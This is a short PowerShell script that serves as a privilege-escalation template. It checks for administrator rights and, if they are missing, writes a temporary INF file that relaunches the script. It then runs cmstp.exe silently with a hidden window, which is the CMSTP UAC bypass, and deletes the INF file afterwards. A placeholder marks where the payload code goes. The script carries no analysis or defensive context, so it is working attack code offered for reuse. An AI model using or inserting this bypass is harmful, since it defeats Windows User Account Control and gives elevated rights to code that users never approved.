function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    Write-Host "[INFO] Using CMSTP bypass..." -ForegroundColor Yellow
    
    $infPath = "$env:TEMP\elev.inf"
    
    @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5

[DefaultInstall]
RunPreSetupCommands=CommandSection

[CommandSection]
$PSCommandPath

[Strings]
ServiceName="Elevation"
"@ | Out-File -FilePath $infPath -Encoding ASCII
    
    Start-Process "C:\Windows\System32\cmstp.exe" -ArgumentList "/s `"$infPath`"" -WindowStyle Hidden
    Start-Sleep 3
    Remove-Item $infPath -Force -ErrorAction SilentlyContinue
    exit
}

Write-Host "`n[+] Running with Administrator privileges." -ForegroundColor Green

# your code goes here
pause
